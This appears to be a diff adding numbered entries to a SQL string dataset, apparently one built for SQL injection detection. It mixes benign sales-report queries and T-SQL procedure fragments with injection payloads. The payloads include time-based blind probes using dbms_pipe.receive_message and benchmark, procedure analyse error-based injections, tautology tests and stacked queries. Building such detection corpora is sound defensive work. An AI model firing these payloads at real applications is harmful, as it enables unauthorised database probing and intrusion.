@@ -1,0 +1,24 @@
+6 set ansi_nulls on 
+13 1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('aatp'='aatp 
+93 -7444))) or 1342=9774 
+178 1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) 
+181 1');select benchmark(5000000,md5(0x714e4153))# 
+188 1));select benchmark(5000000,md5(0x714e4153))# 
+206 select prod_subcategory_desc as subcategory, calendar_quarter_desc as quarters, calendar_month_desc as months, trunc(amount_sold,0) as sales, trunc(sum (amount_sold) over (order by prod_subcategory_desc),0) psc_sales, trunc(sum (amount_sold) over (),0) tot_sales from chan_prodcat_monthly_sales where calendar_year_id ='1803' order by prod_subcategory_desc, calendar_quarter_desc, calendar_month_desc 
+207 1%");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ("%"=" 
+281 -4947' order by 1# 
+316 1" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) 
+555 select @shipdate = dateadd(day,6,@orderdate), @duedate= dateadd(day,12,@orderdate) 
+558 1%"))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)-- 
+565 set @dateto = isnull (@dateto, getdate()) 
+619 create procedure [dbo].[sprptticketssales] @datefrom date = null, @dateto date = null, @branchid int = -1 as begin set nocount on 
+626 select prod_subcategory_desc as subcategory, calendar_month_desc as month, amount_sold as sales, sum(amount_sold) over (order by prod_subcategory_id, calendar_month_desc) as cum_sales from prodcat_monthly_sales where calendar_year_id ='1803' order by prod_subcategory_id, calendar_month_id 
+637 -8625 or 3176=2519# fvgl 
+674 select p.id, p.producttypeid, producttype = pt.name, p.code, p.name, p.sysid, p.sortorder, active = case p.active when 1 then 'y' else 'n' end, p.createdby, p.createdon, p.lasteditby, p.lastediton, si.branchid, dt.groupname, dt.suplvl1name from products p inner join saleitems si on si.productuid = p.id inner join producttypes pt on pt.id = p.producttypeid inner join directorytreeproductsmap dtpm on p.id = dtpm.productid inner join vwdirectorytreehierarchy dt on dt.groupid = dtpm.directorytreeid where p.active = 1 and si.branchid in (0, @branchid) end 
+690 1' in boolean mode) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)# 
+788 1) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) 
+924 if object_id('dbo.spgeneratedatedimension') is not null drop procedure [dbo].[spgeneratedatedimension] 
+1006 1') as dajk where 1452=1452 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)# 
+1019 1') and 4822=6997 and ('ojku'='ojku 
+1066 1%') procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)# 
+1067 1')));select benchmark(5000000,md5(0x714e4153))# 
